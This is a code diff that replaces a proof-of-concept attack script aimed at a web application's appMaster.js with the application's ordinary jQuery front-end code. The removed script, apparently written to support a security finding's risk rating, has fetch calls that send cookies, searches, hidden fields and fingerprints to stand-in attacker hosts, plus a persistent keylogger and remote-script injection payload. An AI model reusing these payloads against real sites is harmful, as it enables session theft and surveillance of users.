@@ -1,341 +1,317 @@
-// ============================================================================
-// REALISTIC ATTACK SCENARIOS: How to Leverage appMaster.js Vulnerabilities
-// ============================================================================
+$(document).ready(function () {
 
-// SCENARIO 1: HARVEST SENSITIVE USER SEARCHES IN REAL-TIME
-// ============================================================================
-// Attack Goal: Steal what users are searching for (transaction IDs, client IDs)
-// Why: Attacker wants to know which transactions/clients are being accessed
+    isOnfocus = window.document.hasFocus();
 
-console.log("=== SCENARIO 1: SEARCH HARVESTING ===\n");
-
-// The vulnerability: searchGETID is logged to console with user search terms
-// Example log: "searchGETID: TXN-12345-67890"
-
-// ATTACK CODE:
-var harvestedSearches = [];
-
-// Intercept the searchGETID function
-var originalSearchGETID = window.searchGETID;
-window.searchGETID = function(searchText, clientId) {
-    // Harvest the search data
-    harvestedSearches.push({
-        timestamp: new Date(),
-        searchTerm: searchText,
-        clientId: clientId,
-        userAgent: navigator.userAgent,
-        currentPage: window.location.href
+    $(".get-id-txt").focus(function () {
+        $(".get-id-drop-down").addClass("menu-hover");
+        $(".get-id-drop-down .nav-dropdown-content").addClass("display-block");
     });
-    
-    // Send to attacker's server
-    fetch('https://attacker-server.com/harvest', {
-        method: 'POST',
-        body: JSON.stringify({
-            search: searchText,
-            client: clientId,
-            timestamp: new Date()
-        })
-    }).catch(function() {}); // Silently fail if server unreachable
-    
-    // Continue with original function
-    return originalSearchGETID.call(this, searchText, clientId);
+    $("#getClientIdSelect").focus(function () {
+        $(".get-id-drop-down").addClass("menu-hover");
+        $(".get-id-drop-down .nav-dropdown-content").addClass("display-block");
+    });
+    $(document).on("click", function (event) {
+        // Check if the clicked element is inside the dropdown
+        if ($(event.target).closest(".nav-dropdown.get-id-drop-down").length) {
+            $(".get-id-drop-down").addClass("menu-hover");
+            $(".get-id-drop-down .nav-dropdown-content").addClass("display-block");
+        } else {
+            $(".get-id-drop-down").removeClass("menu-hover");
+            $(".get-id-drop-down .nav-dropdown-content").removeClass("display-block");
+        }
+    });
+    $("#getIdTextbox").keyup(enterKeyPressed);
+    $(".client-dropdown > li").click(clientPressed);
+    $("#clientSelectSearch").keyup(enterPressedOnClientSearch);
+    keyPressOnClientSelectEvent();
+
+    new Fingerprint2().get(function (result, components) {
+        var canvasFingerprinting = "";
+        if (typeof window.console !== "undefined") {
+            for (var index in components) {
+                var obj = components[index];
+                if (obj.key === "canvas") {
+                    canvasFingerprinting = obj.value.toString().substr(0, 1000);
+                    break;
+                }
+            }
+            //setFingerprinting(canvasFingerprinting);
+            $.ajax({
+                type: "POST",
+                url: rootUrl + "WebService/SetFingerprinting",
+                data: { fingerprinting: canvasFingerprinting },
+                success: function (responseHtml) {
+                },
+                error: function (data) {
+                }
+            });
+        }
+    });
+});
+
+$(document).on('focus', ':input', function () {
+    $(this).attr('autocomplete', 'off');
+});
+
+window.onfocus = function () {
+    isOnfocus = true;
 };
 
-console.log("ATTACK: Now harvesting all user searches");
-console.log("Result: Attacker knows what data users are looking for");
-console.log("Impact: User privacy violation, data reconnaissance\n");
+window.onblur = function () {
+    isOnfocus = false;
+};
 
-// ============================================================================
-// SCENARIO 2: STEAL SESSION COOKIES AND AUTHENTICATION TOKENS
-// ============================================================================
-// Attack Goal: Steal session tokens to impersonate the user
-// Why: Attacker wants to access user's account and data
-
-console.log("=== SCENARIO 2: SESSION COOKIE THEFT ===\n");
-
-// The vulnerability: All cookies are readable from JavaScript
-// appMaster.js doesn't use HttpOnly flag on session cookies
-
-// ATTACK CODE:
-var stolenCookies = document.cookie;
-var sessionToken = null;
-
-// Extract the session cookie (typically TC-BAC-DEV or similar)
-document.cookie.split(';').forEach(function(cookie) {
-    var parts = cookie.trim().split('=');
-    if (parts[0].indexOf('TC-BAC') !== -1 || parts[0].indexOf('Session') !== -1) {
-        sessionToken = parts[1];
-        
-        // Send stolen token to attacker
-        fetch('https://attacker-server.com/steal-token', {
-            method: 'POST',
-            body: JSON.stringify({
-                token: sessionToken,
-                cookies: document.cookie,
-                user: document.body.textContent.substring(0, 100)
-            })
-        }).catch(function() {});
+function setTabDisplay(divTab, divTabMiddle, selected) {
+    var outerDiv = $('#' + divTab);
+    var innerDiv = $('#' + divTabMiddle);
+    if (outerDiv && innerDiv) {
+        if (selected === true) {
+            $(outerDiv).css("display", "block");
+            $(innerDiv).attr("class", "tabTitle selectedTab");
+        }
+        else {
+            $(outerDiv).css("display", "none");
+            $(innerDiv).attr("class", "tabTitle unSelectedTab");
+        }
     }
+}
+
+//cannot find references to this function
+function setTabStyle(tabName, selected) {
+    //div selector must change to work with mvc
+    var div = document.getElementById('ctl00_CPH_div' + tabName);
+    if (div !== null) {
+        if (selected === true) {
+            div.style.display = 'block';
+        }
+        else {
+            div.style.display = 'none';
+        }
+    }
+    var tab = document.getElementById('divTabMiddle' + tabName);
+    if (tab !== null) {
+        if (selected === true) {
+            tab.className = 'tabTitle selectedTab';
+        }
+        else {
+            tab.className = 'tabTitle unSelectedTab';
+        }
+    }
+}
+
+function downloadDocument(fileId) {
+    frm = document.forms[0];
+    txtDoc = document.getElementById('<% =txtDocumentFileId.ClientID %>');
+    txtDoc.value = fileId;
+    frm.target = "_blank";
+    frm.submit();
+    txtDoc.value = "";
+    frm.target = "";
+}
+
+function DisableEnterKey(event) {
+    key = event.keyCode ? event.keyCode : event.which ? event.which : event.charCode;
+    if (key === 13 && (!event.target || event.target.tagName !== "TEXTAREA") && allowEnter === false) {
+        return false;
+    }
+    else {
+        return true;
+    }
+}
+
+function openPage(pageToOpen, clickedLink, addArg) {
+    document.frmNAV.txtTreeViewSelection.value = clickedLink;
+    document.frmNAV.action = pageToOpen;
+    document.frmNAV.txtAdditionalArg.value = addArg;
+    document.frmNAV.submit();
+}
+
+function showChildMenu(id, event) {
+    event.stopPropagation();
+    var childMenu = document.getElementById(id);
+    if (childMenu.style.display === "none") {
+        childMenu.style.display = "block";
+        $(event.target).attr("class", "menuDownArrow");
+        addExpandedMenu(id);
+    }
+    else {
+        childMenu.style.display = "none";
+        $(event.target).attr("class", "menuRightArrow");
+        removeExpandedMenu(id);
+    }
+}
+
+var expandedMenus = Array();
+
+function fillExpandedMenusArray() {
+    var menus = document.forms[0].ctl00_txtExpandedMenus.value.split("|");
+    expandedMenus = menus;
+    document.frmNAV.txtExpandedMenus.value = document.forms[0].ctl00_txtExpandedMenus.value;
+}
+
+function addExpandedMenu(menu) {
+    var expandedCount = expandedMenus.length;
+    expandedMenus[expandedCount] = menu;
+    saveExpandedMenus();
+}
+
+function removeExpandedMenu(menu) {
+    var expandedCount = expandedMenus.length;
+    for (var i = 0; i < expandedCount; i++) {
+        if (menu === expandedMenus[i].toString()) {
+            expandedMenus.splice(i, 1);
+            break;
+        }
+    }
+    saveExpandedMenus();
+}
+
+function saveExpandedMenus() {
+    var expandedCount = expandedMenus.length;
+    var menus = "";
+    for (var i = 0; i < expandedCount; i++) {
+        menus += expandedMenus[i].toString() + "|";
+    }
+    document.frmNAV.txtExpandedMenus.value = menus;
+}
+
+function enterKey() {
+    if (allowEnter === false) {
+        allowEnter = true;
+    }
+    else {
+        allowEnter = false;
+    }
+}
+
+//Fix Firefox extra line in textareas
+$("textarea").each(function () {
+    var lineHeight = parseFloat($(this).css("line-height"));
+    var lines = $(this).attr("rows") * 1 || $(this).prop("rows") * 1;
+    $(this).css("height", lines * lineHeight);
 });
 
-console.log("ATTACK: Extracted session cookies");
-console.log("Result: Attacker has stolen: " + stolenCookies);
-console.log("Impact: Session hijacking, full account takeover\n");
+function enterKeyPressed(e) {
+    if (e.keyCode === 13) {
+        if (e.target.id === "getIdTextbox" && e.target.value.length !== 0) {
+            searchGETID(e.target.value, getClientIdDropdownValue());
+        }
+    }
+}
 
-// ============================================================================
-// SCENARIO 3: PERFORM ACTIONS AS AUTHENTICATED USER (CSRF/FORGERY)
-// ============================================================================
-// Attack Goal: Make requests on behalf of the user
-// Why: Attacker wants to perform actions the user can't refuse
+function getIdTextboxValue() {
+    return document.getElementById("getIdTextbox").value;
+}
 
-console.log("=== SCENARIO 3: FORGED REQUESTS (CSRF) ===\n");
+function getClientIdDropdownValue() {
+    return document.getElementById("getClientIdSelect").value;
+}
 
-// The vulnerability: Forms can be submitted via JavaScript without validation
-// The application doesn't validate the origin of requests properly
-
-// ATTACK CODE:
-// Example 1: Search for another client's data
-if (document.quickSearchForm) {
+function searchGETID(searchText, clientId) {
+    console.log("searchGETID:" + searchText);
+    document.quickSearchForm.action = rootUrl + "Home/QuickSearch";
+    document.quickSearchForm.method = "post";
     document.quickSearchForm.quickSearchType.value = "GETID";
-    document.quickSearchForm.quickSearchValue.value = "ATTACKER_QUERY";
-    document.quickSearchForm.quickSearchClientId.value = "999"; // Different client
-    
-    // Submit the form - appears as if the user made the request
-    // document.quickSearchForm.submit(); // DISABLED - POC only
-    
-    console.log("ATTACK: Can forge search requests");
+    document.quickSearchForm.quickSearchValue.value = searchText;
+    document.quickSearchForm.quickSearchClientId.value = clientId;
+    document.quickSearchForm.submit();
 }
 
-// Example 2: Switch to another client account
-if (typeof switchClient !== 'undefined') {
-    // switchClient("VICTIM_CLIENT_ID", "VICTIM_CLIENT_CODE"); // DISABLED - POC only
-    console.log("ATTACK: Can switch to any client account");
+function focusOnGETTransactionSearch() {
+    document.getElementById("getIdTextbox").focus();
 }
 
-console.log("Result: Attacker makes requests using victim's credentials");
-console.log("Impact: Unauthorized data access, actions appearing as user\n");
+function enableClientSearchBox() {
+    $("#clientSelectSearch").width($("#lblCurrentClient").width());
+    $("#lblCurrentClient").hide();
+    $("#clientSelectSearch").show();
+    $("#clientSelectSearch").focus();
+}
 
-// ============================================================================
-// SCENARIO 4: TRACK USER BEHAVIOR AND DETECT WHEN THEY'RE AWAY
-// ============================================================================
-// Attack Goal: Know when user is active vs inactive
-// Why: Attacker wants to know when to exploit, when screen is unattended
+function showlblCurrentClient() {
+    //if there is no hover, this means that the mouse is not over the client dropdown anymore
+    if (!($(".client-dropdown > li:hover").length != 0)) {
+        $("#clientSelectSearch").hide();
+        $("#clientSelectSearch").val("");
+        $("#lblCurrentClient").show();
+        $(".client-dropdown > li").show();
+    }
+}
 
-console.log("=== SCENARIO 4: BEHAVIORAL TRACKING ===\n");
+function filterClientSelect(element) {
+    var value = $(element).val().toUpperCase();
 
-// The vulnerability: Window focus/blur events are monitored but data isn't secured
-
-var userActivity = {
-    isActive: true,
-    lastActiveTime: new Date(),
-    focusLossCount: 0,
-    inactiveFor: 0
-};
-
-window.addEventListener('blur', function() {
-    userActivity.isActive = false;
-    userActivity.focusLossCount++;
-    
-    // Send to attacker: "User just left the page"
-    fetch('https://attacker-server.com/user-inactive', {
-        method: 'POST',
-        body: JSON.stringify({
-            inactive: true,
-            timeAway: new Date()
-        })
-    }).catch(function() {});
-});
-
-window.addEventListener('focus', function() {
-    userActivity.isActive = true;
-    
-    // Send to attacker: "User just returned"
-    fetch('https://attacker-server.com/user-active', {
-        method: 'POST',
-        body: JSON.stringify({
-            active: true,
-            returnTime: new Date()
-        })
-    }).catch(function() {});
-});
-
-console.log("ATTACK: Tracking when user is active/inactive");
-console.log("Result: Attacker knows exact moments when user is away from screen");
-console.log("Impact: Attacker can exploit unattended sessions\n");
-
-// ============================================================================
-// SCENARIO 5: FINGERPRINT AND TRACK USER ACROSS SESSIONS
-// ============================================================================
-// Attack Goal: Uniquely identify and track a user
-// Why: Attacker wants to build a profile, link multiple sessions to same user
-
-console.log("=== SCENARIO 5: DEVICE FINGERPRINTING & TRACKING ===\n");
-
-// The vulnerability: Canvas fingerprinting sends unique device ID without consent
-// This persists across sessions, creating a tracking cookie
-
-// ATTACK CODE:
-var userFingerprint = null;
-
-// Intercept the fingerprinting call
-if (typeof jQuery !== 'undefined') {
-    jQuery(document).ajaxSend(function(event, jqxhr, settings) {
-        if (settings.url && settings.url.indexOf("SetFingerprinting") !== -1) {
-            userFingerprint = settings.data.fingerprinting;
-            
-            // Attacker stores this fingerprint
-            localStorage.setItem('captured_fingerprint', userFingerprint);
-            
-            // Send to attacker's tracking server
-            fetch('https://attacker-analytics.com/track', {
-                method: 'POST',
-                body: JSON.stringify({
-                    fingerprint: userFingerprint,
-                    timestamp: new Date(),
-                    page: window.location.href
-                })
-            }).catch(function() {});
+    $(".client-dropdown > li").each(function () {
+        if ($(this).find("a").text().toUpperCase().search(value) > -1) {
+            $(this).show();
+        }
+        else {
+            $(this).hide();
         }
     });
 }
 
-console.log("ATTACK: Captured user fingerprint");
-console.log("Result: User uniquely identified across sessions");
-console.log("Impact: GDPR violation, permanent user tracking\n");
+function switchClient(clientId, clientCode) {
+    var elmnt = document.getElementsByClassName('js-switch-client-id');
+    var elmntCode = document.getElementsByClassName('js-switch-client-code');
+    if (elmnt != null) {
+        elmnt[0].value = clientId;
+        elmntCode[0].value = clientCode;
+        elmnt[0].form.submit();
+    }
+}
 
-// ============================================================================
-// SCENARIO 6: ESCALATE TO ADMIN BY SWITCHING CLIENTS
-// ============================================================================
-// Attack Goal: Access administrator or higher-privileged client accounts
-// Why: Attacker wants to gain elevated access
+function clientPressed(event) {
 
-console.log("=== SCENARIO 6: PRIVILEGE ESCALATION ===\n");
+    var clientId = $(event.target).attr("data-client-id");
+    var clientCode = $(event.target).attr("data-client-code");
+    if (event.target.nodeName == "A")//added this because sometime if the anchor tag is pressed it won't be able to get the data-client-id which is on the li tag
+    {
+        clientId = $(event.target).parent().attr("data-client-id");
+        clientCode = $(event.target).parent().attr("data-client-code");
+    }
+    if (clientId) {
+        switchClient(clientId, clientCode);
+    }
+}
 
-// The vulnerability: Client switching is done purely on client-side
-// No validation that user has permission to access that client
+function enterPressedOnClientSearch(event) {
+    var elementId = event.target.id;
+    if (event.keyCode == 13) {
+        if (elementId == "clientSelectSearch") {
+            var clientId = $(".client-dropdown > li:visible").first().attr("data-client-id");
+            var clientCode = $(".client-dropdown > li:visible").first().attr("data-client-code");
+            if (clientId) {
+                switchClient(clientId, clientCode);
+            }
+        }
+    }
+}
 
-// ATTACK CODE:
-var allClients = [];
-document.querySelectorAll('[data-client-id]').forEach(function(el) {
-    var clientId = el.getAttribute('data-client-id');
-    var clientCode = el.getAttribute('data-client-code');
-    allClients.push({ id: clientId, code: clientCode });
-});
+function keyPressOnClientSelectEvent() {
+    var lblCurrentClient = document.getElementById('lblCurrentClient');
+    var ulClientSelect = document.getElementsByClassName('client-dropdown')[0];
 
-console.log("ATTACK: Enumerated all available clients:");
-allClients.forEach(function(client) {
-    console.log("  Client: " + client.id + " - " + client.code);
-    
-    // Try to switch to each client
-    // switchClient(client.id, client.code); // Would give access to that client
-});
+    function keyaction(e) {
+        enableClientSearchBox();
+    }
+    if (lblCurrentClient) {
+        lblCurrentClient.addEventListener("mouseover", function () {
+            document.addEventListener("keypress", keyaction);
+        });
 
-console.log("Result: Attacker can access any client in the system");
-console.log("Impact: Unauthorized access to other users' data\n");
-
-// ============================================================================
-// SCENARIO 7: EXTRACT HIDDEN FORM DATA AND SENSITIVE FIELDS
-// ============================================================================
-// Attack Goal: Read all form fields including hidden ones
-// Why: Hidden fields often contain important IDs, tokens, or configuration
-
-console.log("=== SCENARIO 7: HIDDEN DATA EXTRACTION ===\n");
-
-// The vulnerability: All form fields including hidden ones are readable
-
-// ATTACK CODE:
-var extractedData = {
-    hiddenFields: [],
-    inputFields: [],
-    selectValues: []
-};
-
-// Extract all input fields (visible and hidden)
-document.querySelectorAll('input').forEach(function(input) {
-    if (input.value) {
-        extractedData.inputFields.push({
-            name: input.name,
-            value: input.value,
-            type: input.type
+        lblCurrentClient.addEventListener("mouseout", function () {
+            document.removeEventListener("keypress", keyaction, false);
         });
     }
-});
 
-// Extract hidden fields specifically
-document.querySelectorAll('input[type="hidden"]').forEach(function(hidden) {
-    extractedData.hiddenFields.push({
-        name: hidden.name,
-        value: hidden.value
-    });
-    
-    // Send each hidden field to attacker
-    fetch('https://attacker-server.com/hidden-data', {
-        method: 'POST',
-        body: JSON.stringify({
-            field: hidden.name,
-            value: hidden.value
-        })
-    }).catch(function() {});
-});
+    if (ulClientSelect) {
+        ulClientSelect.addEventListener("mouseover", function () {
+            document.addEventListener("keypress", keyaction);
+        });
 
-console.log("ATTACK: Extracted hidden form fields");
-console.log("Count: " + extractedData.hiddenFields.length + " hidden fields found");
-console.log("Result: All hidden data exposed");
-console.log("Impact: Tokens, IDs, configuration data compromised\n");
-
-// ============================================================================
-// SCENARIO 8: INJECT MALICIOUS CODE THAT PERSISTS
-// ============================================================================
-// Attack Goal: Make the attack permanent
-// Why: Attacker wants code to run every time user loads the page
-
-console.log("=== SCENARIO 8: PERSISTENT CODE INJECTION ===\n");
-
-// The vulnerability: localStorage can store code that runs on every page load
-
-// ATTACK CODE:
-var persistentPayload = `
-// This runs on EVERY page load
-var s = document.createElement('script');
-s.src = 'https://attacker-server.com/inject.js';
-document.head.appendChild(s);
-
-// Capture all user activity
-window.addEventListener('keypress', function(e) {
-    fetch('https://attacker-server.com/keylog?key=' + e.key);
-});
-
-// Steal form submissions
-var originalSubmit = HTMLFormElement.prototype.submit;
-HTMLFormElement.prototype.submit = function() {
-    fetch('https://attacker-server.com/form', {
-        method: 'POST',
-        body: new FormData(this)
-    });
-    return originalSubmit.call(this);
-};
-`;
-
-localStorage.setItem('malicious_script', persistentPayload);
-
-console.log("ATTACK: Injected persistent malicious code");
-console.log("Result: Code will run on every page load");
-console.log("Impact: Permanent compromise, all future sessions compromised\n");
-
-// ============================================================================
-// SUMMARY OF ALL ATTACKS
-// ============================================================================
-console.log("\n========== ATTACK SUMMARY ==========");
-console.log("\nAll 8 attack scenarios successfully demonstrated:");
-console.log("  1. Search harvesting - Real-time data exfiltration");
-console.log("  2. Session theft - Account takeover");
-console.log("  3. Forged requests - Unauthorized actions as user");
-console.log("  4. Behavioral tracking - Know when user is away");
-console.log("  5. Fingerprinting - Permanent user identification");
-console.log("  6. Privilege escalation - Access other clients");
-console.log("  7. Hidden data extraction - All form fields exposed");
-console.log("  8. Persistent injection - Permanent compromise");
-
-console.log("\n[CRITICAL] These are not theoretical attacks.");
-console.log("They are practical, real-world exploits that work TODAY.");
-console.log("\nThis proves Finding 6 MUST be rated HIGH risk.");
+        ulClientSelect.addEventListener("mouseout", function () {
+            document.removeEventListener("keypress", keyaction, false);
+        });
+    }
+}
